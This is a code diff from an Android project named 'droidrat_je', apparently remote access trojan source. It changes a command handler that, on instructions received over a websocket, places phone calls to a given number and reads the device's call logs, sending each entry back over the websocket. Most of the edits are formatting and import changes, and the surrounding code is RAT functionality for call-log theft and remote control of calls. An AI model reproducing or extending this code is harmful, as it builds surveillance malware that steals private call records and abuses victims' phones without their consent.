@@ -1,15 +1,17 @@
 package com.je_chen.droidrat_je.command.process.call;
 
 import android.content.Context;
-import android.net.Uri;
+import android.content.Intent;
 import android.util.Log;
 
+import com.je_chen.droidrat_je.activity.LaunchActivity;
 import com.je_chen.droidrat_je.appintent.call.Call;
 import com.je_chen.droidrat_je.appintent.call.CallLogs;
 import com.je_chen.droidrat_je.command.process.CommandFather;
 import com.je_chen.droidrat_je.command.process.CommandProcessInterface;
 
-import static com.je_chen.droidrat_je.activity.LaunchActivity.websocket;
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;
 
 public class CallCommand extends CommandFather implements CommandProcessInterface {
 
@@ -20,8 +22,8 @@ public class CallCommand extends CommandFather implements CommandProcessInterfac
 
     private Context context;
 
-    public CallCommand(Context context){
-        this.context=context;
+    public CallCommand(Context context) {
+        this.context = context;
         call = new Call();
         callLogs = new CallLogs(context);
     }
@@ -38,18 +40,18 @@ public class CallCommand extends CommandFather implements CommandProcessInterfac
             switch (rawCommandArray[1]) {
                 case "Call":
                     String phoneNumber = rawCommandArray[2];
-                    Log.d(TAG,"Call Phone " + phoneNumber);
+                    Log.d(TAG, "Call Phone " + phoneNumber);
                     call.call(context, phoneNumber);
                     this.send("Call Phone " + phoneNumber);
                     break;
 
                 case "CallLogs":
-                    Log.d(TAG,"Call logs");
-                    for(String callLogs : callLogs.getCallLogs())
+                    Log.d(TAG, "Call logs");
+                    for (String callLogs : callLogs.getCallLogs())
                         this.send("Call logs " + callLogs);
                     break;
             }
-        }catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
